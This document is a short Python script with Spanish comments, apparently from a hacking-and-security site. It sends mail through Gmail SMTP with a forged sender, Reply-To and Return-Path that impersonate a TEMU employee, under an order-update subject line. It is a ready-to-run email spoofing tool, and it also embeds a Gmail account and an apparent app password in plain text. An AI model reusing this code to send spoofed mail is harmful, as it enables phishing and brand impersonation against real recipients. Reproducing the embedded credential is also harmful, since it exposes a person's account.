##############################################################################
# Simple Script en Python version 3, 
# envia correo con smtp.mail.com y spoof origen, en la descripcion del FORM:
# simple Spoffing modificando el FORM del email
# (R) hackingyseguridad.com 2025
##############################################################################

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import ssl
from email.utils import formataddr

class CustomSender:
    def __init__(self):
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
        self.gmail_account = "antonio.taboada@gmail.com"  # Tu cuenta Gmail REAL
        self.app_password = "satk lnxi lpti vav"  # Contraseña de aplicación

        # Remitente personalizado, suplantado
        self.custom_from = ("Wang Li", "Wang_Li@temu.com")  # Nombre + email origen suplantado
        self.recipients = {
            'to': ["antonio.taboada@gmail.com", "antonio.taboada@gmail.com"],  # Destinatarios principales
            'cc': ["antonio.taboada@gmail.com"],  # Con copia
            'bcc': ["antonio.taboada@gmail.com"] # Copia oculta
        }

    def prepare_email(self):
        msg = MIMEMultipart()
        msg["From"] = formataddr(self.custom_from)
        msg["To"] = ", ".join(self.recipients['to'])
        if self.recipients['cc']:
            msg["Cc"] = ", ".join(self.recipients['cc'])

        msg["Subject"] = "Actualización importante de su pedido TEMU"
        msg["Reply-To"] = self.custom_from[1]
        msg["Return-Path"] = self.custom_from[1]

        body = f"""
        Holae,

        ---- un  saludo, Antonio Taboada -

        """

        msg.attach(MIMEText(body, "plain"))
        return msg

    def send_email(self):
        try:
            context = ssl.create_default_context()

            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.ehlo()
                server.starttls(context=context)
                server.ehlo()
                server.login(self.gmail_account, self.app_password)

                message = self.prepare_email()

                all_recipients = (
                    self.recipients['to'] +
                    self.recipients.get('cc', []) +
                    self.recipients.get('bcc', [])
                )

                server.sendmail(
                    self.gmail_account,
                    all_recipients,
                    message.as_string()
                )

                print(f"Correo enviado exitosamente a:")
                print(f"Para: {', '.join(self.recipients['to'])}")
                if self.recipients['cc']:
                    print(f"CC: {', '.join(self.recipients['cc'])}")
                if self.recipients['bcc']:
                    print(f"BCC: {len(self.recipients['bcc'])} destinatario(s) oculto(s)")

        except Exception as e:
            print(f"Error al enviar: {str(e)}")

if __name__ == "__main__":
    sender = CustomSender()
    sender.send_email()
